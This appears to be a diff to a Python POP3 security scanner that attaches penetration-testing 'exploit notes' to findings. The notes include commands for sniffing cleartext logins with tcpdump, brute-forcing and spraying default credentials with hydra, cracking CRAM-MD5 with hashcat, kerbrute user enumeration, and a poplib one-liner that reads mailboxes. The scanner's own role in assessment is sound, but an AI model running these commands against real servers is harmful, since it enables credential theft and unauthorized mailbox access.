@@ -907,7 +907,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "# hashcat -m 11500-style workflow: <md5>:<timestamp>",
                     "Disable APOP - it is a legacy plaintext-equivalent "
                     "mechanism; require SASL over STLS instead.",
-                    ["CWE-916", "CWE-522"], kind="pop3_apop_crackable"))
+                    ["CWE-916", "CWE-522"], kind="pop3_apop_crackable",
+                    exploit_note=(
+                        "tcpdump -i any -A 'tcp port 110 and host IP' during "
+                        "real login ; then hashcat with format <md5>:<timestamp> "
+                        "mode 11500-style ; rockyou.txt is enough for most."),
+                    depth_tier="t2"))
 
             # STLS missing on 110.
             if p.portid == 110 and not pr.get("stls"):
@@ -921,7 +926,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Offer STLS on 110 (Dovecot: ssl = yes + protocols = pop3; "
                     "Cyrus: allowplaintext: no + tls_server_cert set) or move "
                     "mail to 995 / require implicit TLS per RFC 8314.",
-                    ["CWE-319", "CWE-326"], kind="pop3_no_stls"))
+                    ["CWE-319", "CWE-326"], kind="pop3_no_stls",
+                    exploit_note=(
+                        "tcpdump -i any -A 'tcp port 110 and host IP' to "
+                        "capture live USER/PASS"),
+                    depth_tier="t0"))
 
             # Cleartext USER/PASS accepted pre-TLS on 110.
             if p.portid == 110 and pr.get("plaintext_auth") == "accepted":
@@ -937,7 +946,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Require STLS before accepting USER/PASS or SASL PLAIN/"
                     "LOGIN (Dovecot: disable_plaintext_auth = yes; Cyrus: "
                     "allowplaintext: no); prefer implicit TLS on 995.",
-                    ["CWE-319", "CWE-522"], kind="pop3_cleartext_auth"))
+                    ["CWE-319", "CWE-522"], kind="pop3_cleartext_auth",
+                    exploit_note=(
+                        "hydra -L users.txt -P rockyou.txt pop3://IP:110 -t 2 "
+                        "-w 5 (respect any LOGIN-DELAY seen in CAPA)"),
+                    depth_tier="t1"))
 
             # STLS-was-negotiated-but-mechanism-set-unchanged (auth downgrade).
             if pr.get("starttls_downgrade"):
@@ -974,7 +987,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"openssl s_client -connect {h.ip}:{p.portid}   # then CAPA",
                     f"Remove {mech} from the offered mechanisms; require a "
                     "SCRAM-family or Kerberos-only auth policy.",
-                    ["CWE-327", "CWE-522"], kind="pop3_sasl_mechs"))
+                    ["CWE-327", "CWE-522"], kind="pop3_sasl_mechs",
+                    exploit_note=(
+                        "For CRAM-MD5: hashcat -m 10200 <b64_chal>:<b64_resp> "
+                        "rockyou.txt after capturing a real client's AUTH "
+                        "CRAM-MD5 response."),
+                    depth_tier="t2"))
 
             # NTLM Type-2 info leak (AV_PAIRs).
             ntlm_info = pr.get("ntlm_info") or {}
@@ -991,7 +1009,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Remove NTLM from the SASL mech list unless a domain-join "
                     "workflow strictly requires it; restrict the listener to a "
                     "management VLAN.",
-                    ["CWE-200"], kind="pop3_ntlm_info"))
+                    ["CWE-200"], kind="pop3_ntlm_info",
+                    exploit_note=(
+                        "kerbrute userenum -d <dns_domain> --dc <dns_computer> "
+                        "/usr/share/seclists/Usernames/xato-net-10-million-"
+                        "usernames.txt ; also seed impacket-lookupsid."),
+                    depth_tier="t2"))
 
             # SASL challenge captures (CRAM-MD5 / DIGEST-MD5).
             for mech, key, mode in (("CRAM-MD5", "cram_md5", 10200),
@@ -1008,7 +1031,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "hashcat",
                     f"# sniff client's {mech} response, then: hashcat -m {mode} <hash> wordlist.txt",
                     f"Disable {mech} in the SASL mech list; require SCRAM-SHA-256.",
-                    ["CWE-327", "CWE-916"], kind="pop3_sasl_mechs"))
+                    ["CWE-327", "CWE-916"], kind="pop3_sasl_mechs",
+                    exploit_note=(
+                        "For CRAM-MD5: hashcat -m 10200 <b64_chal>:<b64_resp> "
+                        "rockyou.txt after capturing a real client's AUTH "
+                        "CRAM-MD5 response."),
+                    depth_tier="t2"))
 
             # 995 certificate posture.
             cert = pr.get("cert") or {}
@@ -1040,7 +1068,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "vendor",
                         "# consult the vendor advisory for the matched CVE(s)",
                         "Upgrade to a vendor-supported build.",
-                        cwes, kind="pop3_known_cve"))
+                        cwes, kind="pop3_known_cve",
+                        exploit_note=(
+                            "Confirm exact build (CAPA IMPLEMENTATION), then check "
+                            "https://dovecot.org/security.html for the exact CVE; "
+                            "do NOT fire memory-corruption PoC without ROE."),
+                        depth_tier="t0"))
                     break
 
             # User enumeration hits.
@@ -1060,7 +1093,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Return an identical -ERR response (and identical timing) "
                     "for every USER regardless of existence - defer the "
                     "existence check until after PASS.",
-                    ["CWE-203", "CWE-204"], kind="pop3_user_enum"))
+                    ["CWE-203", "CWE-204"], kind="pop3_user_enum",
+                    exploit_note=(
+                        "hydra -L pop3_enum_users.txt -P rockyou.txt "
+                        "pop3://IP:110 -t 2 -w <LOGIN-DELAY+1> ; add -e nsr."),
+                    depth_tier="t2"))
 
             # Credentialed pass: default-creds spray hit.
             cred = pr.get("credentialed") or {}
@@ -1083,7 +1120,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Rotate the credential; audit downstream services that "
                     "share the identity (mail servers usually share AD across "
                     "SMB/VPN/web SSO).",
-                    ["CWE-522"], kind="pop3_mailbox_read"))
+                    ["CWE-522"], kind="pop3_mailbox_read",
+                    exploit_note=(
+                        "python3 -c 'import poplib; p=poplib.POP3_SSL(\"IP\"); "
+                        "p.user(u); p.pass_(pw); print(p.stat()); print(p.list()); "
+                        "print(p.top(1,25))' ; feed addresses to smtp + AD reader."),
+                    depth_tier="t3"))
                 if cred.get("default_creds"):
                     out.append(_finding(
                         "high",
@@ -1097,7 +1139,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "Enforce a strong-secret policy; disable dormant "
                         "accounts; require MFA on downstream identity-linked "
                         "services.",
-                        ["CWE-521", "CWE-307"], kind="pop3_weak_password"))
+                        ["CWE-521", "CWE-307"], kind="pop3_weak_password",
+                        exploit_note=(
+                            "Add pop3 spray of default set (admin/admin, "
+                            "mail/mail, cyrus/cyrus, postmaster/postmaster) -- "
+                            "until then, run manually: hydra -C /usr/share/"
+                            "wordlists/seclists/Passwords/Default-Credentials/"
+                            "default-passwords.txt pop3://IP"),
+                        depth_tier="t3"))
     return out
 
 
